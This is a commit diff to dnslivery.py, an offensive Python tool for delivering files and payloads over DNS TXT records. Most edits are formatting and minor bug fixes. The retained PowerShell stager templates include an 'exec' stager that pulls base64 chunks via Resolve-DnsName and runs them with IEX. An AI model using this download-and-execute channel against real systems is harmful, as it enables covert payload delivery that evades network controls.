3b63c2bf3a7e21bae5fd53fc91b45362e38ad59a
Watson <watson0x90@gmail.com>
2024-10-14 16:34:06 -0600

    Update dnslivery.py

--- dnslivery.py
+++ dnslivery.py
@@ -12,23 +12,23 @@ banner = """
 DNSlivery - Easy files and payloads delivery over DNS
 """
 
-def log(message, msg_type = ''):
-    reset   = '\033[0;m'
+def log(message, msg_type=''):
+    reset = '\033[0;m'
 
     # set default prefix and color
-    prefix  = '[*]'
-    color   = reset
+    prefix = '[*]'
+    color = reset
 
     # change prefix and color based on msg_type
     if msg_type == '+':
-        prefix  = '[+]'
-        color   = '\033[1;32m'
+        prefix = '[+]'
+        color = '\033[1;32m'
     elif msg_type == '-':
-        prefix  = '[-]'
-        color   = '\033[1;31m'
+        prefix = '[-]'
+        color = '\033[1;31m'
     elif msg_type == 'debug':
-        prefix  = '[DEBUG]'
-        color   = '\033[0;33m'
+        prefix = '[DEBUG]'
+        color = '\033[0;33m'
 
     print('%s%s %s%s' % (color, prefix, message, reset))
 
@@ -48,7 +48,7 @@ def signal_handler(signal, frame):
 
 def dns_handler(data):
     # only process dns queries
-    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
+    if data.haslayer(IP) and data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
         # split packet layers
         ip = data.getlayer(IP)
         udp = data.getlayer(UDP)
@@ -57,16 +57,18 @@ def dns_handler(data):
 
         # only process txt queries (type 16)
         if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
-            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
+            if args.verbose:
+                log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
 
             # remove domain part of fqdn and split the different parts of hostname
-            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')
+            hostname = re.sub(r'\.%s\.$' % re.escape(args.domain), '', dnsqr.qname.decode()).split('.')
 
-            # check if hostname match existing file 
+            # check if hostname match existing file
             if len(hostname) > 0 and hostname[0] in chunks:
-                
+
                 # launcher response (default): file.domain
-                if len(hostname) == 1: hostname.append('print')
+                if len(hostname) == 1:
+                    hostname.append('print')
 
                 # launcher response: file.stager.domain
                 if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
@@ -75,30 +77,30 @@ def dns_handler(data):
 
                 # stager response: file.stager.i.domain
                 elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
-                    response = stagers[hostname[0]][hostname[1]][int(hostname[2])-1]
+                    response = stagers[hostname[0]][hostname[1]][int(hostname[2]) - 1]
                     log('Delivering %s %s stager %s/%d to %s' % (hostname[0], hostname[1], int(hostname[2]), len(stagers[hostname[0]][hostname[1]]), ip.src), '+')
 
                 # base64 chunk response: file.i
                 elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) > 0 and int(hostname[1]) <= len(chunks[hostname[0]]):
-                    response = chunks[hostname[0]][int(hostname[1])-1]
+                    response = chunks[hostname[0]][int(hostname[1]) - 1]
                     log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')
 
-                else: return
+                else:
+                    return
 
                 # build response packet
                 rdata = response
                 rcode = 0
                 dn = args.domain
                 an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
-                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)
+                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=60, rdata=args.nameserver)
 
                 response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                 send(response_pkt, verbose=0, iface=args.interface)
-        
 
 if __name__ == '__main__':
     # parse args
-    parser = argparse.ArgumentParser(description = banner)
+    parser = argparse.ArgumentParser(description=banner)
     parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
     parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
     parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
@@ -116,7 +118,7 @@ if __name__ == '__main__':
 
     # verify path exists and is readable
     abspath = os.path.abspath(args.path)
-    
+
     if not os.path.exists(abspath) or not os.path.isdir(abspath):
         log('Path %s does not exist or is not a directory' % abspath, '-')
         sys.exit(-1)
@@ -134,7 +136,7 @@ if __name__ == '__main__':
     stager_templates = {
         'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
         'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
-        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
+        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
     }
 
     # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
@@ -143,9 +145,9 @@ if __name__ == '__main__':
 
     for name in filenames:
         # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
-        sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
-        sanitized = sanitized.lower()                       # lower all chars
-        sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
+        sanitized = re.sub(r'[^\x00-\x7F]', '', name)  # remove non-ascii chars
+        sanitized = sanitized.lower()  # lower all chars
+        sanitized = re.sub(r'[^a-z0-9\-]', '-', sanitized)  # replace chars outside charset to '-'
         filenames[name] = sanitized
 
         # verify args.size is decimal
@@ -157,13 +159,14 @@ if __name__ == '__main__':
 
         try:
             # compute base64 chunks of files
-            with open(os.path.join(abspath, name), 'rb') as f: chunks[filenames[name]] = base64_chunks(f.read(), size)
+            with open(os.path.join(abspath, name), 'rb') as f:
+                chunks[filenames[name]] = base64_chunks(f.read(), size)
 
         except:
             # remove key from dict in case of failure (e.g. file permissions)
             del filenames[name]
             log('Error computing base64 for %s, file will been ignored' % name, '-')
-            break
+            continue
 
         # generate stagers
         stagers[filenames[name]] = {}
@@ -180,4 +183,4 @@ if __name__ == '__main__':
     # listen for DNS query
     log('Listening for DNS queries...')
 
-    while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
+    sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
